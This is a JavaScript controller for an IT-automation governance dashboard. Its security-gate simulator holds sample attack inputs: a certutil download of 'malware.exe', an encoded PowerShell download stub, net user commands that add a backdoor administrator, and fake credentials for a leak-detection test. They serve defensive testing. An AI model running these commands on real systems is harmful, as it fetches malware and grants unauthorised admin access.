/**
 * Elone Agent — SOP Governance Hub Main Controller
 * Handles routing, view mounting, global state, modals, and actions.
 */

import { api } from './api.js';
import { renderOverview } from './views/overview.js';
import { renderPipeline } from './views/pipeline.js';
import { renderPlaybooks } from './views/playbooks.js';
import { renderIngestion } from './views/ingestion.js';
import { renderTools } from './views/tools.js';
import { renderTelemetry } from './views/telemetry.js';
import { renderAudit } from './views/audit.js';

// Application State
const state = {
  currentTab: 'overview',
  theme: localStorage.getItem('elone-theme') || 'dark',
  searchQuery: '',
  selectedDate: null,
  selectedLog: null,
  activeLogContent: '',
  activeSopModal: null,
  cache: {
    overview: null,
    sops: null,
    uploads: null,
    tools: null,
    telemetry: null,
    logs: null,
  }
};

// Apply Initial Theme
document.documentElement.setAttribute('data-theme', state.theme);

// Toast Notification System
export function showToast(message, type = 'info', duration = 4000) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  
  const icon = type === 'success' 
    ? '✓' 
    : type === 'error' 
    ? '✕' 
    : type === 'warning' 
    ? '⚠' 
    : 'ℹ';

  toast.innerHTML = `
    <span style="font-weight: 700; font-size: 14px;">${icon}</span>
    <span style="flex: 1;">${message}</span>
  `;

  container.appendChild(toast);
  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(100%)';
    toast.style.transition = 'all 0.3s ease-out';
    setTimeout(() => toast.remove(), 300);
  }, duration);
}

// Global Tab Switcher
window.switchTab = async function(tabName) {
  state.currentTab = tabName;
  
  // Update Nav Items
  document.querySelectorAll('.nav-item').forEach(el => {
    el.classList.toggle('active', el.dataset.tab === tabName);
  });

  // Update Page Title
  const titles = {
    overview: ['Governance Dashboard', 'Real-time overview of IT automation pipeline, quotas, and security gates.'],
    pipeline: ['5-Phase Ingestion & 7 Security Gates', 'Deterministic pre-checks, multimodal extraction, and dual-layer verification.'],
    playbooks: ['OKF Playbook Repository', 'Deterministic execution-ready IT SOP playbooks compiled Just-In-Time.'],
    ingestion: ['Ingestion Queue & Uploads', 'Monitor monitored uploads directory and run full-cycle conversions.'],
    tools: ['Dynamic Platform Tools Catalog', 'Inspect registered IT platforms and functions available for step binding.'],
    telemetry: ['Multi-Model Telemetry & Cost Accounting', 'Per-call token telemetry, Gemini quota monitor, and expenditure logs.'],
    audit: ['Execution Traces & CoT Audit Logs', 'Direct inspection of internal reasoning traces and validation records.']
  };

  const titleBox = document.querySelector('.page-title-box');
  if (titleBox && titles[tabName]) {
    titleBox.querySelector('h2').textContent = titles[tabName][0];
    titleBox.querySelector('p').textContent = titles[tabName][1];
  }

  await renderCurrentView();
};

// Render Active View
async function renderCurrentView() {
  const viewport = document.getElementById('viewport-container');
  if (!viewport) return;

  try {
    if (state.currentTab === 'overview') {
      const data = await api.getOverview();
      state.cache.overview = data;
      viewport.innerHTML = renderOverview(data, state);
      attachOverviewListeners();
    } 
    else if (state.currentTab === 'pipeline') {
      const data = state.cache.overview || await api.getOverview();
      viewport.innerHTML = renderPipeline(data);
      attachPipelineListeners();
    } 
    else if (state.currentTab === 'playbooks') {
      const data = await api.listSops();
      state.cache.sops = data;
      viewport.innerHTML = renderPlaybooks(data, state);
      attachPlaybookListeners();
    } 
    else if (state.currentTab === 'ingestion') {
      const data = await api.listUploads();
      state.cache.uploads = data;
      viewport.innerHTML = renderIngestion(data, state);
      attachIngestionListeners();
    } 
    else if (state.currentTab === 'tools') {
      const data = await api.getTools();
      state.cache.tools = data;
      viewport.innerHTML = renderTools(data);
    } 
    else if (state.currentTab === 'telemetry') {
      const data = await api.getTelemetry();
      state.cache.telemetry = data;
      viewport.innerHTML = renderTelemetry(data, state);
      attachTelemetryListeners();
    } 
    else if (state.currentTab === 'audit') {
      const data = await api.listLogs();
      state.cache.logs = data;
      if (!state.selectedLog && data.logs && data.logs.length > 0) {
        state.selectedLog = data.logs[0].filename;
        const logData = await api.getLog(state.selectedLog);
        state.activeLogContent = logData.content;
      }
      viewport.innerHTML = renderAudit(data, state);
    }
  } catch (err) {
    showToast(`Error rendering ${state.currentTab}: ${err.message}`, 'error');
  }
}

// ---------------------------------------------------------------------------
// Action Handlers & Event Listeners
// ---------------------------------------------------------------------------

function attachOverviewListeners() {
  const scanBtn = document.getElementById('btn-trigger-scan');
  if (scanBtn) {
    scanBtn.addEventListener('click', async () => {
      scanBtn.disabled = true;
      scanBtn.innerHTML = 'Scanning...';
      try {
        const res = await api.runScan();
        showToast('Full scan cycle completed successfully!', 'success');
        await renderCurrentView();
      } catch (err) {
        showToast(`Scan error: ${err.message}`, 'error');
      } finally {
        scanBtn.disabled = false;
      }
    });
  }
}

function attachPipelineListeners() {
  const simBtn = document.getElementById('btn-run-security-sim');
  if (simBtn) {
    simBtn.addEventListener('click', async () => {
      const input = document.getElementById('security-test-input').value.trim();
      const resultBox = document.getElementById('security-sim-result');
      if (!input) {
        showToast('Please enter a payload or select a sample first.', 'warning');
        return;
      }

      resultBox.innerHTML = '<span style="color: var(--accent-primary);">Analyzing payload across Security Gates...</span>';
      try {
        const res = await api.testSecurity(input, 'all');
        let html = `<div><strong>=== SECURITY GATE VERIFICATION REPORT ===</strong></div>\n`;
        
        // AST Report
        if (res.ast_blacklist) {
          const ast = res.ast_blacklist;
          html += `\n<span style="color: ${ast.is_blocked ? '#ef4444' : '#10b981'};">▶ GATE 6.1 (AST Blacklist): ${ast.verdict}</span>\n`;
          if (ast.matched_threats && ast.matched_threats.length > 0) {
            ast.matched_threats.forEach(t => {
              html += `  - THREAT: ${t.description} (Pattern: ${t.pattern})\n`;
            });
          } else {
            html += `  ✓ No banned LOLBins, encoded PowerShell, or backdoors detected.\n`;
          }
        }

        // DLP Report
        if (res.dlp) {
          const dlp = res.dlp;
          html += `\n<span style="color: ${dlp.has_secrets ? '#f59e0b' : '#10b981'};">▶ GATE 2 (DLP Secret Redactor): ${dlp.has_secrets ? 'SECRETS DETECTED & MASKED' : 'CLEAN (No Secrets Found)'}</span>\n`;
          if (dlp.detected_types && dlp.detected_types.length > 0) {
            dlp.detected_types.forEach(d => html += `  - ${d}\n`);
          }
          if (dlp.sanitized_output !== input) {
            html += `\n<strong>Sanitized Output:</strong>\n${escapeHtml(dlp.sanitized_output)}\n`;
          }
        }

        // Unicode Report
        if (res.unicode && res.unicode.zero_width_detected) {
          html += `\n<span style="color: #f59e0b;">▶ Unicode Sanitizer: Zero-width / invisible characters detected & stripped.</span>\n`;
        }

        resultBox.innerHTML = `<pre style="font-family: inherit; font-size: inherit; white-space: pre-wrap;">${html}</pre>`;
      } catch (err) {
        resultBox.innerHTML = `<span style="color: var(--danger);">Error: ${err.message}</span>`;
      }
    });
  }
}

window.loadSecuritySample = function(type) {
  const input = document.getElementById('security-test-input');
  if (!input) return;

  const samples = {
    lolbin: 'certutil.exe -urlcache -split -f http://192.168.1.100/malware.exe C:\\temp\\malware.exe',
    encoded: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==',
    backdoor: 'net user admin_backdoor P@ssw0rd123! /add\nnet localgroup administrators admin_backdoor /add',
    dlp: 'Connecting to database with api_key="sk-proj-98748392817264839281726" and password="SuperSecretPassword123!" for employee john.doe@company.com',
    clean: 'Test-Connection -ComputerName "app-server-01" -Count 2\nGet-Service -Name "Spooler" | Restart-Service'
  };

  input.value = samples[type] || '';
  showToast(`Loaded sample payload: ${type}`, 'info');
};

function attachPlaybookListeners() {
  const searchInput = document.getElementById('playbook-search-input');
  if (searchInput) {
    searchInput.addEventListener('input', (e) => {
      state.searchQuery = e.target.value;
      const data = state.cache.sops;
      if (data) {
        document.getElementById('viewport-container').innerHTML = renderPlaybooks(data, state);
        attachPlaybookListeners();
      }
    });
  }
}

function attachIngestionListeners() {
  const dropzone = document.getElementById('sop-dropzone');
  const fileInput = document.getElementById('sop-file-input');

  if (dropzone && fileInput) {
    dropzone.addEventListener('click', () => fileInput.click());

    dropzone.addEventListener('dragover', (e) => {
      e.preventDefault();
      dropzone.classList.add('dragover');
    });

    dropzone.addEventListener('dragleave', () => dropzone.classList.remove('dragover'));

    dropzone.addEventListener('drop', async (e) => {
      e.preventDefault();
      dropzone.classList.remove('dragover');
      if (e.dataTransfer.files.length > 0) {
        await handleFileUpload(e.dataTransfer.files[0]);
      }
    });

    fileInput.addEventListener('change', async () => {
      if (fileInput.files.length > 0) {
        await handleFileUpload(fileInput.files[0]);
      }
    });
  }

  const scanBtn = document.getElementById('btn-run-full-scan');
  if (scanBtn) {
    scanBtn.addEventListener('click', async () => {
      scanBtn.disabled = true;
      scanBtn.innerHTML = 'Running Scan Cycle...';
      try {
        await api.runScan();
        showToast('Ingestion scan cycle complete!', 'success');
        await renderCurrentView();
      } catch (err) {
        showToast(`Scan error: ${err.message}`, 'error');
      } finally {
        scanBtn.disabled = false;
      }
    });
  }
}

async function handleFileUpload(file) {
  showToast(`Uploading ${file.name}...`, 'info');
  try {
    const res = await api.uploadFile(file);
    if (res.gate1_passed) {
      showToast(`Uploaded ${file.name}! Passed Gate 1 pre-checks.`, 'success');
    } else {
      showToast(`Uploaded ${file.name}, but failed Gate 1: ${res.gate1_error}`, 'warning');
    }
    await renderCurrentView();
  } catch (err) {
    showToast(`Upload failed: ${err.message}`, 'error');
  }
}

window.triggerIngest = async function(filename) {
  const customId = prompt(`Convert '${filename}' into OKF Playbook.\n\nEnter custom SOP ID override (optional):`, '');
  if (customId === null) return; // user cancelled

  showToast(`Starting JIT conversion for ${filename}...`, 'info', 6000);
  try {
    const res = await api.ingestSingle(filename, customId.trim() || null);
    if (res.success) {
      showToast(`Conversion complete! Generated Playbook: ${res.sop_id}`, 'success', 6000);
      await renderCurrentView();
    } else {
      showToast(`Ingestion halted: ${res.reason || res.error}`, 'error', 7000);
    }
  } catch (err) {
    showToast(`Ingestion error: ${err.message}`, 'error');
  }
};

window.previewPlan = async function(filename) {
  showToast(`Running dry-run planner for ${filename}...`, 'info');
  try {
    const res = await api.planPreview(filename);
    if (res.success) {
      openModal(
        `Dry-Run Plan Preview: ${filename}`,
        `<pre style="background: #07090e; padding: 16px; border-radius: 8px; font-family: var(--font-mono); font-size: 11px; color: #a5b4fc; max-height: 500px; overflow-y: auto;">${escapeHtml(JSON.stringify(res.draft, null, 2))}</pre>`,
        `<button class="btn btn-secondary" onclick="window.closeModal()">Close</button>`
      );
    }
  } catch (err) {
    showToast(`Plan preview error: ${err.message}`, 'error');
  }
};

function attachTelemetryListeners() {
  const select = document.getElementById('telemetry-date-select');
  if (select) {
    select.addEventListener('change', (e) => {
      state.selectedDate = e.target.value;
      const data = state.cache.telemetry;
      if (data) {
        document.getElementById('viewport-container').innerHTML = renderTelemetry(data, state);
        attachTelemetryListeners();
      }
    });
  }
}

window.loadLogFile = async function(filename) {
  state.selectedLog = filename;
  showToast(`Loading log ${filename}...`, 'info');
  try {
    const data = await api.getLog(filename);
    state.activeLogContent = data.content;
    const viewData = state.cache.logs || await api.listLogs();
    document.getElementById('viewport-container').innerHTML = renderAudit(viewData, state);
  } catch (err) {
    showToast(`Error reading log: ${err.message}`, 'error');
  }
};

window.copyActiveLog = function() {
  if (!state.activeLogContent) return;
  navigator.clipboard.writeText(state.activeLogContent);
  showToast('Raw log copied to clipboard!', 'success');
};

// ---------------------------------------------------------------------------
// Deep Playbook Inspector Modal
// ---------------------------------------------------------------------------

window.inspectPlaybook = async function(sopId) {
  showToast(`Fetching ${sopId}...`, 'info');
  try {
    const data = await api.getSop(sopId);
    const fm = data.frontmatter || {};
    const steps = data.steps || [];
    const integrity = data.integrity || {};
    const rulebook = data.rulebook || {};

    const modalBody = `
      <div style="display: flex; flex-direction: column; gap: 18px;">
        <!-- Top Metadata Row -->
        <div style="background: var(--bg-tertiary); padding: 14px 18px; border-radius: var(--radius-md); border: 1px solid var(--card-border); display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; font-size: 12px;">
          <div>
            <span style="color: var(--text-muted); font-size: 10px; font-weight: 700; text-transform: uppercase;">Category:</span>
            <div style="font-weight: 600; color: var(--text-primary);">${fm.category || 'N/A'}</div>
          </div>
          <div>
            <span style="color: var(--text-muted); font-size: 10px; font-weight: 700; text-transform: uppercase;">Platform / OS:</span>
            <div style="font-weight: 600; color: var(--text-primary); font-family: var(--font-mono);">${fm.platform || 'system'} / ${fm.target_os || 'windows'}</div>
          </div>
          <div>
            <span style="color: var(--text-muted); font-size: 10px; font-weight: 700; text-transform: uppercase;">Confidence Score:</span>
            <div style="font-weight: 700; color: #10b981;">${Math.round((fm.confidence_score || 1) * 100)}% (${fm.confidence_level || 'High'})</div>
          </div>
          <div>
            <span style="color: var(--text-muted); font-size: 10px; font-weight: 700; text-transform: uppercase;">HMAC Signature:</span>
            <div style="font-weight: 700; color: ${integrity.is_valid ? '#10b981' : '#f59e0b'};">${integrity.status || 'CHECKING'}</div>
          </div>
        </div>

        <div>
          <strong style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">Description:</strong>
          <p style="font-size: 13px; color: var(--text-secondary); margin-top: 4px;">${fm.description || 'No description provided.'}</p>
        </div>

        ${fm.required_entities && fm.required_entities.length > 0 ? `
          <div>
            <strong style="font-size: 11px; color: var(--text-muted); text-transform: uppercase;">Required Variable Entities:</strong>
            <div style="display: flex; gap: 6px; margin-top: 4px;">
              ${fm.required_entities.map(e => `<code style="background: rgba(99, 102, 241, 0.15); color: #a5b4fc; padding: 2px 7px; border-radius: 4px; font-size: 11px;">{entities.${e}}</code>`).join('')}
            </div>
          </div>
        ` : ''}

        <!-- Execution Steps List -->
        <div>
          <h4 style="font-size: 14px; font-weight: 700; color: var(--text-primary); margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
            <span>Verified Execution Sequence (${steps.length} Steps)</span>
            <span class="badge-tag">Deterministic Workflow</span>
          </h4>

          <div style="display: flex; flex-direction: column; gap: 12px;">
            ${steps.map((s, idx) => `
              <div class="sop-step-card">
                <div class="step-card-header">
                  <div style="display: flex; align-items: center; gap: 8px;">
                    <span class="step-badge-number">Step ${s.step_number || (idx + 1)}</span>
                    <span class="step-type-pill">${s.step_type || 'command'}</span>
                    ${s.shell ? `<span style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted);">${s.shell}</span>` : ''}
                  </div>
                  ${s.timeout_seconds ? `<span style="font-size: 10px; color: var(--text-muted);">Timeout: ${s.timeout_seconds}s</span>` : ''}
                </div>

                <div class="step-description">${s.sop_step_description || ''}</div>

                ${s.command ? `
                  <div class="code-snippet-box">
                    <code>${escapeHtml(s.command)}</code>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeJsString(s.command)}'); window.showToast('Command copied!', 'success');">Copy</button>
                  </div>
                ` : ''}

                ${s.fallback_command ? `
                  <div style="margin-top: 6px;">
                    <span style="font-size: 10px; font-weight: 700; color: #f59e0b; text-transform: uppercase;">Fallback Command:</span>
                    <div class="code-snippet-box" style="margin-top: 2px; border-color: rgba(245, 158, 11, 0.3);">
                      <code>${escapeHtml(s.fallback_command)}</code>
                    </div>
                  </div>
                ` : ''}

                <div class="step-meta-row">
                  ${s.execute_if ? `<div class="step-meta-item"><span>Condition:</span> <code style="color: #38bdf8;">${escapeHtml(s.execute_if)}</code></div>` : ''}
                  ${s.parse_instruction ? `<div class="step-meta-item"><span>Parse:</span> <em>${escapeHtml(s.parse_instruction)}</em></div>` : ''}
                </div>
              </div>
            `).join('')}
          </div>
        </div>

        <!-- Reflection Rulebook Matrix -->
        ${rulebook.exists ? `
          <div style="border-top: 1px solid var(--card-border); padding-top: 14px;">
            <h4 style="font-size: 13px; font-weight: 700; color: #a5b4fc; margin-bottom: 6px;">
              Adaptive Reflection Rulebook (Runtime Learning Matrix)
            </h4>
            <pre style="background: #07090e; padding: 12px; border-radius: 6px; font-family: var(--font-mono); font-size: 11px; color: #cbd5e1; max-height: 180px; overflow-y: auto;">${escapeHtml(rulebook.content)}</pre>
          </div>
        ` : ''}
      </div>
    `;

    const modalFooter = `
      <button class="btn btn-primary" onclick="window.verifyIntegrityLive('${sopId}')">
        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        Re-Verify HMAC Digital Stamp
      </button>
      <button class="btn btn-secondary" onclick="window.closeModal()">Close</button>
    `;

    openModal(`OKF Playbook: ${sopId}`, modalBody, modalFooter);
  } catch (err) {
    showToast(`Error inspecting SOP: ${err.message}`, 'error');
  }
};

window.verifyIntegrityLive = async function(sopId) {
  showToast(`Verifying HMAC-SHA256 digital stamp for ${sopId}...`, 'info');
  try {
    const res = await api.verifySop(sopId);
    if (res.is_valid) {
      showToast(`HMAC Stamp Authentic: Playbook is 100% untampered.`, 'success', 5000);
    } else {
      showToast(`Integrity Alert: ${res.reason}`, 'warning', 6000);
    }
  } catch (err) {
    showToast(`Verification error: ${err.message}`, 'error');
  }
};

// ---------------------------------------------------------------------------
// Modal Helpers
// ---------------------------------------------------------------------------

function openModal(title, bodyHtml, footerHtml = '') {
  let modal = document.getElementById('global-modal');
  if (!modal) {
    modal = document.createElement('div');
    modal.id = 'global-modal';
    modal.className = 'modal-overlay';
    modal.innerHTML = `
      <div class="modal-card">
        <div class="modal-header">
          <h3 id="modal-title"></h3>
          <button class="btn btn-icon-only btn-outline" onclick="window.closeModal()">✕</button>
        </div>
        <div class="modal-body" id="modal-body"></div>
        <div class="modal-footer" id="modal-footer"></div>
      </div>
    `;
    document.body.appendChild(modal);
    modal.addEventListener('click', (e) => {
      if (e.target === modal) window.closeModal();
    });
  }

  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-body').innerHTML = bodyHtml;
  document.getElementById('modal-footer').innerHTML = footerHtml;
  modal.classList.add('active');
}

window.closeModal = function() {
  const modal = document.getElementById('global-modal');
  if (modal) modal.classList.remove('active');
};

// ---------------------------------------------------------------------------
// Theme Toggle & Utilities
// ---------------------------------------------------------------------------

window.toggleTheme = function() {
  state.theme = state.theme === 'dark' ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', state.theme);
  localStorage.setItem('elone-theme', state.theme);
  showToast(`Switched to ${state.theme} mode`, 'info');
};

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function escapeJsString(str) {
  if (!str) return '';
  return String(str).replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n');
}

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

document.addEventListener('DOMContentLoaded', () => {
  // Navigation Listeners
  document.querySelectorAll('.nav-item').forEach(el => {
    el.addEventListener('click', (e) => {
      e.preventDefault();
      window.switchTab(el.dataset.tab);
    });
  });

  // Global search input in header
  const globalSearch = document.getElementById('global-search');
  if (globalSearch) {
    globalSearch.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        state.searchQuery = globalSearch.value;
        window.switchTab('playbooks');
      }
    });
  }

  // Load Initial View
  window.switchTab('overview');
});
